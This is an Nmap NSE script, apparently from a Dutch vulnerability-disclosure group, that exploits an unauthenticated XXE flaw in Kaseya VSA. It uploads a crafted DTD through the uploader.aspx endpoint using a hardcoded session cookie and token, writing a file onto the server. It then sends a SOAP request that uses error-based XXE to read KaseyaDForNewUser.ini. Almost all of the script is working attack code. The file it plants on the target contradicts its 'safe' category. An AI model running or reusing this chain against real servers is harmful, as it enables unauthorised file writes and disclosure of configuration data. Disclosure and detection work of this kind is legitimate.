local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local strbuf = require "strbuf"
local vulns = require "vulns"
local rand = require "rand"



description = [[
*TODO*
]]

---
--@output

author = "Frank Breedijk of Dutch Institute for Vulnerability Disclosure (DIVD.nl)"
last_update = "April 08, 2021"
license = "Simplified (2-clause) BSD license--See https://nmap.org/svn/docs/licenses/BSD-simplified"
categories = {"default", "discovery", "safe", "vuln", "exploit"}

portrule = shortport.port_or_service( {80, 443, 5721}, {"http", "https"}, "tcp", "open")

local last_len = 0

function split(source, delimiters)
    local elements = {}
    local pattern = '([^'..delimiters..']+)'
    string.gsub(source, pattern, function(value) elements[#elements + 1] =     value;  end);
    return elements
end


action = function(host, port, redirects)
  local dis_count, noun

  local randomname = ".divd." .. rand.random_string(16,'abcdefghijklmnopqrstuvwxyz1234567890') .. ".dtd"
  local vuln = {
    title = "Kaseya VSA Unauthenticated XML eXternal Entity attack",
    state = vulns.STATE.NOT_VULN,
    description = [[
Kaseya VSA is vulnerable for an XML eXternal Entity (XXE) attack in /vsaWS/KaseyaWS.asmx
Vulnerability discovered by Wietse Boonstra of DIVD (https://www.divd.nl/team/Wietse%20Boonstra/)

This exploit should have left file ']] .. randomname .. [[' on the system in C:\Kayseya\Webpages\ 
    ]],
    IDS = {
        CVE = "CVE-2021-xxxxx"
    },
    references = {
        'http://csirt.divd.nl/DIVD-2021-00002'
    },
    dates = {
        disclosure = { year = '2021', month = '07', day = '01' }
    }
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local v_level = nmap.verbosity() + (nmap.debugging()*2)
  local output = strbuf.new()
  local detail = 15

  local uploadpath = "/SystemTab/uploader.aspx?Filename=" .. randomname .. "&PathData=C%3A%5CKaseya%5CWebPages%5C&__RequestValidationToken=ac1906a5-d511-47e3-8500-47cc4b0ec219&qqfile=" .. randomname
  local attackpath = "/vsaWS/KaseyaWS.asmx"

  options = {header={}}    
  options['header']['User-Agent'] = "Mozilla/5.0 (Kaseya vulnerability check)"
  options['header']['Cookie'] =  "sessionId=92812726; %5F%5FRequestValidationToken=ac1906a5%2Dd511%2D47e3%2D8500%2D47cc4b0ec219"

  local dtdcontent = [[
<!ENTITY % file SYSTEM "file://c:\\kaseya\\kserver\\KaseyaDForNewUser.ini">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
  ]]
  local xmlcontent = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:kas="KaseyaWS">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <kas:PrimitiveResetPassword>\n         <!--type: string-->\n          <kas:XmlRequest><![CDATA[<!DOCTYPE data SYSTEM "file://c:/Kaseya/Webpages/' .. randomname .. '"><data>&send;</data>]]>\n</kas:XmlRequest>\n      </kas:PrimitiveResetPassword>\n   </soapenv:Body>\n</soapenv:Envelope>'

  local answer = http.post(host, port, uploadpath, options, false, dtdcontent)

  if answer.status == 301 or answer.status == 302 then
    return "Error " .. answer.status .. " : " .. table.concat(answer.location," -> ")
  elseif answer.status ~= 200 then
    return "Error: " .. tostring(answer["status-line"]) .. "on .dtd POST"
  end

  options['header']['Content-Type'] = 'text/xml;charset=UTF-8'
  answer = http.post(host, port, attackpath, options, false, xmlcontent)
  if answer.status == 301 or answer.status == 302 then
    return "Error " .. answer.status .. " : " .. table.concat(answer.location," -> ")
  elseif answer.status ~= 500 then
    return "Error: " .. tostring(answer["status-line"]) .. "on xml POST"
  end

  if string.find(answer.body,"Enter your username and password") then
      vuln.state = vulns.STATE.VULN
  else
    return "Exploitation of " .. vuln['IDS']['CVE'] .. " unsuccessful."
  end
  
  return vuln_report:make_output(vuln)
  --return answer
end
